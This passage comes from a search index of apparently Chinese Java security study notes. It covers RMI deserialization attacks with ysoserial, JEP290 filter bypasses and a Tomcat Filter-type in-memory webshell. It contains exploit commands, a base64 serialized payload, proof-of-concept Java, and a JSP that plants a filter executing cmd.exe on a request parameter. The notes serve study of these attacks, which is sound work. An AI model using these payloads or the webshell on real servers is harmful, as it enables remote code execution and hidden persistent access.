); // RMI\u8c03\u7528\u6307\u4ee4 ObjectOutputStream objOut = new MarshalOutputStream ( dos ); objOut . writeLong ( 0 ); // RegistryImpl_Skel objOut . writeInt ( 0 ); objOut . writeLong ( 0 ); objOut . writeShort ( 0 ); objOut . writeInt ( 0 ); // bind objOut . writeLong ( 4905912898345647071L ); // \u63a5\u53e3Hash\u503c\uff0c\u8fd9\u91cc\u662f\u56fa\u5b9a\u7684 // \u5199\u5165\u6076\u610f\u7684\u5e8f\u5217\u5316\u5bf9\u8c61 objOut . writeObject ( payloadObject ); os . flush (); } finally { // \u5173\u95edSocket\u8f93\u51fa\u6d41 if ( dos != null ) { dos . close (); } // \u5173\u95edSocket\u8fde\u63a5 if ( s != null ) { s . close (); } } } }","title":"ysoserial\u53cd\u5236\u4e0e\u9632\u8303"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/RMI/#\u6ce8\u518c\u4e2d\u5fc3\u653b\u51fb\u5ba2\u6237\u7aef","text":"\u8fd9\u4e2a\u653b\u51fb\u4e00\u822c\u662f\u4ee5\u4e0b\u6d41\u7a0b: \u6211\u4eec\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u5668\u7684\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u8ba9\u5176\u4f5c\u4e3a\u5ba2\u6237\u7aef\u4e3b\u52a8\u8fde\u63a5\u6211\u4eec\u672c\u5730\u7684\u6076\u610f\u6ce8\u518c\u4e2d\u5fc3\uff0c\u6ce8\u518c\u4e2d\u5fc3\u518d\u8fd4\u56de\u4e00\u4e2a\u6076\u610f\u6784\u9020\u7684\u5e8f\u5217\u5316\u5bf9\u8c61\uff0c\u5ba2\u6237\u7aef\u5c06\u5176\u53cd\u5e8f\u5217\u5316\u4ece\u800c\u6700\u7ec8\u9020\u6210\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u5e38\u7528\u4e8e\u7ed5\u8fc7waf\u548c\u6d4b\u8bd5gadget \u5728\u4e86\u89e3\u8fd9\u4e2a\u653b\u51fb\u65b9\u5f0f\u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u53bb\u4e86\u89e3RMI\u534f\u8bae\uff0c\u53c2\u8003\u6587\u7ae0: attack-rmi-registry-and-server-with-socket \u5177\u4f53\u4ee3\u7801\u53c2\u8003ysoserial\u4e2d\u7684exploit/JRMPListener\u3002","title":"\u6ce8\u518c\u4e2d\u5fc3\u653b\u51fb\u5ba2\u6237\u7aef"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/RMI/#\u653b\u51fb\u6d41\u7a0b_2","text":"\u8fd0\u884c java -jar ysoserial.jar JRMPClient 127.0.0.1:2099 | base64 -w 0 \u751f\u6210\u4e00\u6bb5\u6076\u610f\u5e8f\u5217\u5316\u5bf9\u8c61\u8ba9\u5176\u56de\u8fde\u6211\u4eec\u7684\u6076\u610f\u6ce8\u518c\u4e2d\u5fc3 \u8fd0\u884c java -cp ysoserial.jar ysoserial.exploit.JRMPListener 2099 CommonsCollections5 \"calc.exe\" \u542f\u52a8\u4e00\u4e2a\u6076\u610f\u7684\u6ce8\u518c\u4e2d\u5fc3 \u624b\u52a8\u6a21\u62df\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u70b9 ```java package top.longlone.RMIStudy; import sun.misc.BASE64Decoder; import java.io.*; public class vuln { public static void main(String[] args) throws IOException, ClassNotFoundException { // \u4e0a\u8ff0base64\u4e4b\u540e\u7684\u5e8f\u5217\u5316\u5bf9\u8c61\uff0c\u5176\u4f1a\u56de\u8fde\u6211\u4eec127.0.0.1:2099\u7684\u6076\u610f\u6ce8\u518c\u4e2d\u5fc3 byte[] data = new BASE64Decoder().decodeBuffer(\"rO0ABXN9AAAAAQAaamF2YS5ybWkucmVnaXN0cnkuUmVnaXN0cnl4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcgAtamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdEludm9jYXRpb25IYW5kbGVyAAAAAAAAAAICAAB4cgAcamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdNNhtJEMYTMeAwAAeHB3MgAKVW5pY2FzdFJlZgAJMTI3LjAuMC4xAAAIMwAAAABkqebwAAAAAAAAAAAAAAAAAAAAeA==\"); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); ois.readObject(); } } `` 4. \u8fd0\u884c\u4e0a\u8ff0\u4ee3\u7801\uff0c\u6210\u529f\u5728\u5ba2\u6237\u7aef\u5f39\u51fa\u8ba1\u7b97\u5668: ![](https://gitee.com/guuest/images/raw/master/img/20211118112950.png) \u5176\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u7684\u4f4d\u7f6e\u5728 sun.rmi.registry.RegistryImpl_Stub#lookup`:","title":"\u653b\u51fb\u6d41\u7a0b"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/RMI/#\u5ba2\u6237\u7aef\u653b\u51fb\u6ce8\u518c\u4e2d\u5fc3","text":"\u8fd9\u79cd\u653b\u51fb\u65b9\u5f0f\u4e0d\u592a\u5e38\u89c1(\u56e0\u4e3a\u6ce8\u518c\u4e2d\u5fc3\u4e00\u822c\u4e0d\u53ef\u80fd\u66b4\u9732\u5728\u5916\u7f51)\uff0c\u6211\u4eec\u8fd9\u91cc\u6765\u6a21\u62df\u653b\u51fb\u4e00\u4e0b: \u5728\u4e86\u89e3\u8fd9\u4e2a\u653b\u51fb\u65b9\u5f0f\u4e4b\u524d\uff0c\u6211\u4eec\u540c\u6837\u9700\u8981\u53bb\u4e86\u89e3RMI\u534f\u8bae\uff0c\u53c2\u8003\u6587\u7ae0: attack-rmi-registry-and-server-with-socket \u5177\u4f53\u4ee3\u7801\u53c2\u8003ysoserial\u4e2d\u7684exploit/JRMPClient\u3002","title":"\u5ba2\u6237\u7aef\u653b\u51fb\u6ce8\u518c\u4e2d\u5fc3"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/RMI/#\u653b\u51fb\u6d41\u7a0b_3","text":"\u8fd0\u884c\u5f00\u5934\u7684\u6ce8\u518c\u4e2d\u5fc3\u4ee3\u7801\uff0c\u542f\u52a8\u4e00\u4e2a\u6b63\u5e38\u7684\u6ce8\u518c\u4e2d\u5fc3 \u8fd0\u884c java -cp ysoserial.jar ysoserial.exploit.JRMPClient 127.0.0.1 2099 CommonsCollections5 \"calc.exe\" \uff0c\u6210\u529f\u5728\u6ce8\u518c\u4e2d\u5fc3\u5f39\u51fa\u8ba1\u7b97\u5668 \u5176\u539f\u7406\u662fRMI\u6846\u67b6\u91c7\u7528DGC(Distributed Garbage Collection)\u5206\u5e03\u5f0f\u5783\u573e\u6536\u96c6\u673a\u5236\u6765\u7ba1\u7406\u8fdc\u7a0b\u5bf9\u8c61\u7684\u751f\u547d\u5468\u671f,\u53ef\u4ee5\u901a\u8fc7\u4e0eDGC\u901a\u4fe1\u7684\u65b9\u5f0f\u53d1\u9001\u6076\u610fpayload\u8ba9\u6ce8\u518c\u4e2d\u5fc3\u53cd\u5e8f\u5217\u5316\u3002 \u5176\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u7684\u4f4d\u7f6e\u5728 sun.rmi.transport.DGCImpl_Skel#dispatch :","title":"\u653b\u51fb\u6d41\u7a0b"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/RMI/#jep290","text":"\u53c2\u8003\u4e00\u4e9b\u5e08\u5085\u7684\u6587\u7ae0\uff0c\u5728JDK8u121\uff0cJDK7u13\uff0cJDK6u141\u4e4b\u540e\u6dfb\u52a0\u4e86\u4e00\u4e2a\u65b0\u7684\u5b89\u5168\u673a\u5236JEP290\uff0c\u6838\u5fc3\u5176\u5b9e\u5c31\u662f\u589e\u52a0\u4e86\u4e00\u4e2a ObjectInputFilter \u63a5\u53e3\uff0c\u53ef\u4ee5\u5c06 filter \u8bbe\u7f6e\u7ed9 ObjectInputStream \u5bf9\u8c61\uff0c\u5728\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u89e6\u53d1 filter \u7684\u68c0\u6d4b\u673a\u5236\u3002 \u8fd9\u4e2a\u8fc7\u6ee4\u7684\u767d\u540d\u5355\u6211\u4eec\u6700\u7ec8\u53ef\u4ee5\u5728 RegistryImpl#registryFilter \u65b9\u6cd5\u4e2d\u770b\u5230: \u767d\u540d\u5355\u7684\u5185\u5bb9\u5982\u4e0b: String / Number / Remote / Proxy / UnicastRef / RMIClientSocketFactory / RMIServerSocketFactory / ActivationID / UID \u53ea\u8981\u53cd\u5e8f\u5217\u5316\u7684\u7c7b\u4e0d\u662f\u767d\u540d\u5355\u4e2d\u7684\u7c7b\uff0c\u5c31\u4f1a\u8fd4\u56de REJECTED \u64cd\u4f5c\u7b26\uff0c\u8868\u793a\u5e8f\u5217\u5316\u6d41\u4e2d\u6709\u4e0d\u5408\u6cd5\u7684\u5185\u5bb9\uff0c\u76f4\u63a5\u629b\u51fa\u5f02\u5e38\u3002","title":"JEP290"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/RMI/#bypass-8u1218u230","text":"","title":"Bypass 8u121~8u230"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/RMI/#unicastref-\u7c7b","text":"UnicastRef \u662f\u5728\u767d\u540d\u5355\u4e0a\u7684\uff0cRMI Server \u6216\u8005 Client \u548c Registry \u7684\u901a\u4fe1\u5c31\u57fa\u4e8e\u5b83\u3002\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ea\u8981\u901a\u8fc7\u5728\u76ee\u6807\u4e0a\u53cd\u5e8f\u5217\u5316\u8fd9\u4e2a\u7c7b\uff0c\u5b83\u5c31\u4f1a\u53d1\u8d77\u4e00\u4e2aJRMP\u8fde\u63a5\uff0c\u8bf7\u6c42\u6211\u4eec\u63a7\u5236\u7684\u6076\u610f\u6ce8\u518c\u4e2d\u5fc3\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec \u6ce8\u518c\u4e2d\u5fc3\u653b\u51fb\u5ba2\u6237\u7aef \u7684\u539f\u7406\u3002","title":"UnicastRef \u7c7b"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/RMI/#remoteobject-\u7c7b","text":"RemoteObject \u662f\u4e00\u4e2a\u62bd\u8c61\u7c7b\uff0c\u5728\u540e\u9762\u7684 Bypass \u601d\u8def\u6784\u9020\u4e2d\u5b83\u4f1a\u626e\u6f14\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u89d2\u8272\u3002\u5b83\u5b9e\u73b0\u4e86 Remote \u548c Serializable \u63a5\u53e3\uff0c\u4ee3\u8868\u5b83\uff08\u53ca\u5176\u5b50\u7c7b\uff09\u53ef\u4ee5\u901a\u8fc7\u767d\u540d\u5355\u7684\u68c0\u6d4b\uff0c\u800c Bypass \u5229\u7528\u7684\u5173\u952e\u70b9\u5c31\u662f\u5b83\u7684 readObject \u65b9\u6cd5\u3002\u6211\u4eec\u7f16\u5199\u4ee5\u4e0b\u4ee3\u7801\u624b\u52a8\u6a21\u62df\u653b\u51fb: package top.longlone.RMIStudy ; import java.rmi.RemoteException ; import java.rmi.registry.LocateRegistry ; public class RMIRegistry { public static void main ( String [] args ) { try { LocateRegistry . createRegistry ( 2099 ); } catch ( RemoteException e ) { e . printStackTrace (); } while ( true ) ; } } package top.longlone.RMIStudy ; import sun.misc.BASE64Decoder ; import sun.rmi.server.UnicastRef ; import sun.rmi.transport.LiveRef ; import sun.rmi.transport.tcp.TCPEndpoint ; import java.io.* ; import java.rmi.AlreadyBoundException ; import java.rmi.registry.LocateRegistry ; import java.rmi.registry.Registry ; import java.rmi.server.ObjID ; import java.rmi.server.RemoteObjectInvocationHandler ; import java.util.Random ; public class vuln { public static void main ( String [] args ) throws IOException , ClassNotFoundException , AlreadyBoundException { Registry registry = LocateRegistry . getRegistry ( 2099 ); ObjID id = new ObjID ( new Random (). nextInt ()); TCPEndpoint te = new TCPEndpoint ( \"127.0.0.1\" , 9999 ); UnicastRef ref = new UnicastRef ( new LiveRef ( id , te , false )); RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler ( ref ); // lookup\u65b9\u6cd5\u4e5f\u53ef\u4ee5\uff0c\u4f46\u9700\u8981\u624b\u52a8\u6a21\u62dflookup\u65b9\u6cd5\u7684\u6d41\u7a0b registry . rebind ( \"pwn\" , handler ); } } \u8c03\u8bd5\u8fc7\u7a0b\u5982\u4e0b: \u7528ysoserial\u542f\u52a8JRMPClient\uff0c\u7136\u540e\u8c03\u8bd5RMIRegistry\uff0c\u5728 RemoteObject#readObject \u65b9\u6cd5\u4e2d\u4e0b\u65ad\u70b9\uff0c\u6700\u540e\u518d\u8fd0\u884cvuln\u89e6\u53d1\u65ad\u70b9\u3002 \u8ddf\u8fdbreadExternal\u65b9\u6cd5: \u5728\u8fd9\u4e2a\u65b9\u6cd5\u4e2d\u4f1a\u8bfb\u51fa\u5e8f\u5217\u5316\u6d41\u4e2d\u7684 host \u548c\u7aef\u53e3\u4fe1\u606f\uff0c\u7136\u540e\u91cd\u65b0\u5c01\u88c5\u6210\u4e00\u4e2a LiveRef \u5bf9\u8c61\uff0c\u5c06\u5176\u5b58\u50a8\u5230\u5f53\u524d\u7684 ConnectionInputStream \u4e0a\uff0c\u8c03\u7528 saveRef \u65b9\u6cd5: \u4e00\u76f4\u8ddf\u8fdb\u5230RegistryImpl_Skel\u7684oldDispatch\u65b9\u6cd5: \u5728\u670d\u52a1\u7aef\u89e6\u53d1\u4e86\u53cd\u5e8f\u5217\u5316\u4e4b\u540e\uff0c\u6765\u5230 StreamRemoteCall#releaseInputStream \u65b9\u6cd5\u4e2d\uff0c\u5728\u8fd9\u91cc\u4f1a\u8c03\u7528 ConnectionInputStream#registerRefs \u65b9\u6cd5: \u8fd9\u91cc\u53c8\u4f1a\u8c03\u7528DGCClient\u7684registerRefs\u65b9\u6cd5: \u6700\u7ec8\u7531 DGCClient \u5411\u6076\u610f\u7684 JRMP \u6ce8\u518c\u4e2d\u5fc3\u53d1\u8d77 lookup \u8fde\u63a5: \u8fd9\u91cc\u7684\u653b\u51fb\u65b9\u6cd5\u770b\u8d77\u6765\u4e0e\u4e0a\u9762\u7684 \u6ce8\u518c\u4e2d\u5fc3\u653b\u51fb\u5ba2\u6237\u7aef \u6709\u70b9\u7c7b\u4f3c\uff0c\u4f46\u662f\u8fd9\u91cc\u7528\u7684\u4e0d\u662f\u76f4\u63a5\u53cd\u5e8f\u5217\u5316\u800c\u662f\u901a\u8fc7\u5f80\u6ce8\u518c\u4e2d\u5fc3rebind\u6076\u610f\u5bf9\u8c61\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u9020\u6210\u7684\uff0c\u5176\u6700\u7ec8\u76ee\u7684\u90fd\u662f\u4e3a\u4e86 \u8ba9\u670d\u52a1\u7aef\u53d8\u4e3aJRMP\u5ba2\u6237\u7aef\u5411\u6211\u4eec\u6076\u610f\u7684JRMPRegistry\u53d1\u8d77JRMP\u8bf7\u6c42 \u3002","title":"RemoteObject \u7c7b"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/RMI/#\u603b\u7ed3","text":"\u6240\u4ee5 Bypass JEP290 \u7684\u5173\u952e\u5728\u4e8e\uff1a \u901a\u8fc7\u53cd\u5e8f\u5217\u5316\u8ba9\u670d\u52a1\u7aef\u53d8\u4e3aJRMP\u5ba2\u6237\u7aef\u5411\u6211\u4eec\u6076\u610f\u7684JRMPRegistry\u53d1\u8d77 JRMP \u8bf7\u6c42\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/RMI/#bypass-8u2318u240","text":"TODO: \u4f7f\u7528\u4e86UnicastRemoteObject\uff0c\u540e\u8865","title":"Bypass 8u231~8u240"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/RMI/#\u53c2\u8003\u6587\u7ae0","text":"https://paper.seebug.org/1194 https://xz.aliyun.com/t/8247","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/","tags":["java","java\u5b89\u5168","\u5185\u5b58\u9a6c"],"text":"Tomcat-Filter\u578b\u5185\u5b58\u9a6c # \u53c2\u8003\u6587\u7ae0 # http://wjlshare.com/archives/1529 Tomcat-Filter # filter\u987e\u540d\u601d\u4e49\u5c31\u662f\u8fc7\u6ee4\u5668\u7684\u610f\u601d\uff0c\u5728tomca\u4e2d\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u81ea\u5b9a\u4e49\u8fc7\u6ee4\u5668\u6765\u505a\u5230\u5bf9\u7528\u6237\u7684\u4e00\u4e9b\u8bf7\u6c42\u8fdb\u884c\u62e6\u622a\u4fee\u6539\u7b49\u64cd\u4f5c: \u6211\u4eec\u7684\u8bf7\u6c42\u4f1a\u5728\u7ecf\u8fc7Servlet\u4e4b\u524d\u5148\u7ecf\u8fc7filter\uff0c\u90a3\u4e48\u5982\u679c\u6211\u4eec\u52a8\u6001\u521b\u5efa\u4e00\u4e2afilter\u5e76\u5c06\u5176\u653e\u5728\u6700\u524d\u9762\uff0c\u5e76\u5728\u8fd9\u4e2afilter\u4e2d\u653e\u5165\u6076\u610f\u4ee3\u7801\uff0c\u5f53\u6211\u4eec\u8bbf\u95eeServlet\u7684\u65f6\u5019\u5c31\u80fd\u6210\u529f\u6267\u884c\u6211\u4eec\u7684\u6076\u610f\u4ee3\u7801\uff0c\u8fd9\u4e5f\u662f\u6240\u8c13\u7684\u5185\u5b58webshell(\u56e0\u4e3afilter\u662f\u52a8\u6001\u521b\u5efa\u7684\uff0c\u6ca1\u6709\u6587\u4ef6\u843d\u5730)\uff0c\u90a3\u4e48\u8981\u5982\u4f55\u52a8\u6001\u5730\u521b\u5efa\u4e00\u4e2afilter\u5462\uff1f Filter\u6d41\u7a0b\u5206\u6790 # \u6211\u4eec\u5148\u6765\u4e86\u89e3\u4e00\u4e0b\u5728Tomcat\u4e2d\u4e0eFilter\u5bc6\u5207\u76f8\u5173\u7684\u51e0\u4e2a\u7c7b: - FilterDefs\uff1a\u5b58\u653eFilterDef\u7684\u6570\u7ec4 \uff0cFilterDef \u4e2d\u5b58\u50a8\u7740\u6211\u4eec\u8fc7\u6ee4\u5668\u540d\uff0c\u8fc7\u6ee4\u5668\u5b9e\u4f8b\uff0c\u4f5c\u7528 url \u7b49\u57fa\u672c\u4fe1\u606f - FilterConfigs\uff1a\u5b58\u653efilterConfig\u7684\u6570\u7ec4\uff0c\u5728 FilterConfig \u4e2d\u4e3b\u8981\u5b58\u653e FilterDef \u548c Filter\u5bf9\u8c61\u7b49\u4fe1\u606f - FilterMaps\uff1a\u5b58\u653eFilterMap\u7684\u6570\u7ec4\uff0c\u5728 FilterMap \u4e2d\u4e3b\u8981\u5b58\u653e\u4e86 FilterName \u548c \u5bf9\u5e94\u7684URLPattern - FilterChain\uff1a\u8fc7\u6ee4\u5668\u94fe\uff0c\u8be5\u5bf9\u8c61\u4e0a\u7684 doFilter \u65b9\u6cd5\u80fd\u4f9d\u6b21\u8c03\u7528\u94fe\u4e0a\u7684 Filter - WebXml\uff1a\u5b58\u653e web.xml \u4e2d\u5185\u5bb9\u7684\u7c7b - ContextConfig\uff1aWeb\u5e94\u7528\u7684\u4e0a\u4e0b\u6587\u914d\u7f6e\u7c7b - StandardContext\uff1aContext\u63a5\u53e3\u7684\u6807\u51c6\u5b9e\u73b0\u7c7b\uff0c\u4e00\u4e2a Context \u4ee3\u8868\u4e00\u4e2a Web \u5e94\u7528\uff0c\u5176\u4e0b\u53ef\u4ee5\u5305\u542b\u591a\u4e2a Wrapper - StandardWrapperValve\uff1a\u4e00\u4e2a Wrapper \u7684\u6807\u51c6\u5b9e\u73b0\u7c7b\uff0c\u4e00\u4e2a Wrapper \u4ee3\u8868\u4e00\u4e2aServlet \u7136\u540e\u6211\u4eec\u7f16\u5199\u4e00\u4e2aDemoFilter\u6765\u505a\u6d4b\u8bd5: package top.longlone.filter ; import javax.servlet.* ; import java.io.IOException ; public class DemoFilter implements Filter { @Override public void init ( FilterConfig filterConfig ) throws ServletException { System . out . println ( \"filter init\" ); } @Override public void doFilter ( ServletRequest request , ServletResponse response , FilterChain chain ) throws IOException , ServletException { System . out . println ( \"do filter\" ); chain . doFilter ( request , response ); } @Override public void destroy () { } } \u914d\u7f6e\u597d\u5bf9\u5e94\u7684web.xml: <filter> <filter-name> DemoFilter </filter-name> <filter-class> top.longlone.filter.DemoFilter </filter-class> </filter> <filter-mapping> <filter-name> DemoFilter </filter-name> <url-pattern> /* </url-pattern> </filter-mapping> \u63a5\u4e0b\u6765\u5728 doFilter() \u65b9\u6cd5\u6253\u4e0b\u65ad\u70b9\uff0c\u8fd0\u884ctomcat\u670d\u52a1\u5668\u5e76\u8bbf\u95ee: \u67e5\u770b\u8c03\u7528\u6808\uff0c\u8ddf\u8fdb StandardWrapperVavle.invoke() \u65b9\u6cd5: \u53d1\u73b0\u4ed6\u662f\u6839\u636efilterChain\u6765\u53bb\u505afilter\u7684\uff0c\u6839\u636e\u641c\u7d22\u627e\u5230filterChain\u7684\u5b9a\u4e49\u4f4d\u7f6e: \u91cd\u65b0\u4e0b\u65ad\u70b9\u5230\u8fd9\u4e2a\u4f4d\u7f6e\uff0c\u8ddf\u8fdb ApplicationFilterFactory.createFilterChain() \u65b9\u6cd5\uff0c\u5206\u6790\u8be5\u65b9\u6cd5\uff0c\u53d1\u73b0\u5176\u5148\u4f1a\u4f1a\u8c03\u7528 getParent() \u65b9\u6cd5\u83b7\u53d6 StandardContext \uff0c\u518d\u83b7\u53d6filterMaps: filterMaps\u4e2d\u7684 filterMap \u4e3b\u8981\u5b58\u653e\u4e86\u8fc7\u6ee4\u5668\u7684\u540d\u5b57\u4ee5\u53ca\u4f5c\u7528\u7684 url: \u63a5\u4e0b\u6765\u4f1a\u904d\u5386filterMaps \u4e2d\u7684 filterMap\uff0c\u5982\u679c\u53d1\u73b0\u7b26\u5408\u5f53\u524d\u8bf7\u6c42 url \u4e0e filterMap \u4e2d\u7684 urlPattern \u5339\u914d\u4e14\u901a\u8fc7filterName\u80fd\u627e\u5230\u5bf9\u5e94\u7684filterConfig\uff0c\u5219\u4f1a\u5c06\u5176\u52a0\u5165filterChain: \u67e5\u770bfilterConfig\u7684\u7ed3\u6784\uff0c\u91cc\u9762\u4e3b\u8981\u5305\u542b\u4e86filter\u540d\uff0cfilter\u548cfilterDef: \u81f3\u6b64filterChain\u7ec4\u88c5\u5b8c\u6bd5\uff0c\u91cd\u65b0\u56de\u5230 StandardContextValue \u4e2d\uff0c\u540e\u9762\u4f1a\u8c03\u7528 filterChain.doFilter() \u65b9\u6cd5: \u8ddf\u8fdb filterChain.doFilter() \u65b9\u6cd5\uff0c\u5176\u4f1a\u8c03\u7528 internalDoFilter() \u65b9\u6cd5: \u4f1a\u4ecefilters\u4e2d\u4f9d\u6b21\u62ff\u5230filter\u548cfilterConfig\uff0c\u6700\u7ec8\u8c03\u7528 filter.doFilter() : \u5f15\u7528\u4e00\u5f20\u7ecf\u5178\u56fe\u7247\u6765\u63cf\u8ff0filter\u7684\u5de5\u4f5c\u539f\u7406: \u5185\u5b58\u9a6c\u5b9e\u73b0\u6d41\u7a0b\u5206\u6790 # \u6839\u636e\u4e0a\u9762\u7684\u8c03\u8bd5\uff0c\u6211\u4eec\u53d1\u73b0\u6700\u5173\u952e\u7684\u5c31\u662f StandardContext.findFilterMaps() \u548c StandardContext.findFilterConfig() \uff0c\u6211\u4eec\u53ef\u4ee5\u6765\u770b\u770b\u8fd92\u4e2a\u65b9\u6cd5\u7684\u5b9e\u73b0\uff0c\u53ef\u4ee5\u770b\u5230\u90fd\u662f\u76f4\u63a5\u4eceStandardContext\u4e2d\u53d6\u5230\u5bf9\u5e94\u7684\u5c5e\u6027\uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u8981\u5f80\u8fd92\u4e2a\u5c5e\u6027\u91cc\u9762\u63d2\u5165\u5bf9\u5e94\u7684filterMap\u548cfilterConfig\u5373\u53ef\u5b9e\u73b0\u52a8\u6001\u6dfb\u52a0filter\u7684\u76ee\u7684: \u5b9e\u9645\u4e0aStandardContext\u4e5f\u6709\u4e00\u4e9b\u65b9\u6cd5\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u6dfb\u52a0\u5c5e\u6027\u3002\u9996\u5148\u6211\u4eec\u6765\u770bfiltermaps\uff0cStandardContext\u76f4\u63a5\u63d0\u4f9b\u4e86\u5bf9\u5e94\u7684\u6dfb\u52a0\u65b9\u6cd5(Before\u662f\u5c06filter\u653e\u5728\u9996\u4f4d\uff0c\u6b63\u662f\u6211\u4eec\u9700\u8981\u7684)\uff0c\u8fd9\u91cc\u518d\u5f80filterMaps\u6dfb\u52a0\u4e4b\u524d\u4f1a\u6709\u4e00\u4e2a\u6821\u9a8cfiltermap\u662f\u5426\u5408\u6cd5\u7684\u64cd\u4f5c\uff0c\u8ddf\u8fdb validateFilterMap() : \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u6709\u4e00\u4e2a\u5751\u70b9\uff0c\u5b83\u4f1a\u6839\u636efilterName\u53bb\u5bfb\u627e\u5bf9\u5e94\u7684filterDef\uff0c\u5982\u679c\u6ca1\u627e\u5230\u7684\u8bdd\u4f1a\u76f4\u63a5\u629b\u51fa\u5f02\u5e38\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u8fd8\u9700\u8981\u5f80filterDefs\u91cc\u6dfb\u52a0filterDef\u3002 \u90a3\u4e48\u6211\u4eec\u63a5\u4e0b\u6765\u518d\u770bfilterDefs\uff0cStandardContext\u76f4\u63a5\u63d0\u4f9b\u4e86\u5bf9\u5e94\u7684\u6dfb\u52a0\u65b9\u6cd5: \u6700\u540e\u6211\u4eec\u518d\u6765\u770bfilterConfigs\uff0c\u6839\u636e\u547d\u540d\u89c4\u5219\u641c\u7d22 addFilterConfig \uff0c\u53d1\u73b0\u5e76\u6ca1\u6709\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u6240\u4ee5\u6211\u4eec\u8003\u8651\u8981\u901a\u8fc7\u53cd\u5c04\u7684\u65b9\u6cd5\u624b\u52a8\u83b7\u53d6\u5c5e\u6027\u5e76\u6dfb\u52a0: \u6700\u540e\u603b\u7ed3\u4e0bFilter\u578b\u5185\u5b58\u9a6c(\u5373\u52a8\u6001\u521b\u5efafilter)\u7684\u6b65\u9aa4: 1. \u83b7\u53d6StandardContext 2. \u7ee7\u627f\u5e76\u7f16\u5199\u4e00\u4e2a\u6076\u610ffilter 3. \u5b9e\u4f8b\u5316\u4e00\u4e2aFilterDef\u7c7b\uff0c\u5305\u88c5filter\u5e76\u5b58\u653e\u5230StandardContext.filterDefs\u4e2d 4. \u5b9e\u4f8b\u5316\u4e00\u4e2aFilterMap\u7c7b\uff0c\u5c06\u6211\u4eec\u7684 Filter \u548c urlpattern \u76f8\u5bf9\u5e94\uff0c\u5b58\u653e\u5230StandardContext.filterMaps\u4e2d(\u4e00\u822c\u4f1a\u653e\u5728\u9996\u4f4d) 5. \u901a\u8fc7\u53cd\u5c04\u83b7\u53d6filterConfigs\uff0c\u5b9e\u4f8b\u5316\u4e00\u4e2aFilterConfig(ApplicationFilterConfig)\u7c7b\uff0c\u4f20\u5165StandardContext\u4e0efilterDefs\uff0c\u5b58\u653e\u5230filterConfig\u4e2d \u4ee5\u4e0b\u662f\u4ee3\u7801\u7684\u5177\u4f53\u5b9e\u73b0: <!-- tomcat 8 --> <%@ page import=\"org.apache.catalina.core.ApplicationContext\" %> <%@ page import=\"java.lang.reflect.Field\" %> <%@ page import=\"org.apache.catalina.core.StandardContext\" %> <%@ page import=\"java.util.Map\" %> <%@ page import=\"java.io.IOException\" %> <%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterDef\" %> <%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterMap\" %> <%@ page import=\"java.lang.reflect.Constructor\" %> <%@ page import=\"org.apache.catalina.core.ApplicationFilterConfig\" %> <%@ page import=\"org.apache.catalina.Context\" %> <%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%> <% String name = \"Longlone\"; // \u83b7\u53d6StandardContext ServletContext servletContext = request.getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); // \u83b7\u53d6filterConfigs Field Configs = standardContext.getClass().getDeclaredField(\"filterConfigs\"); Configs.setAccessible(true); Map filterConfigs = (Map) Configs.get(standardContext); if (filterConfigs.get(name) == null) { Filter filter = new Filter() { @Override public void init(FilterConfig filterConfig) throws ServletException { } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest req = (HttpServletRequest) servletRequest; if (req.getParameter(\"cmd\") != null) { byte[] bytes = new byte[1024]; Process process = new ProcessBuilder(\"cmd.exe\", \"/C\", req.getParameter(\"cmd\")).start(); int len = process.getInputStream().read(bytes); 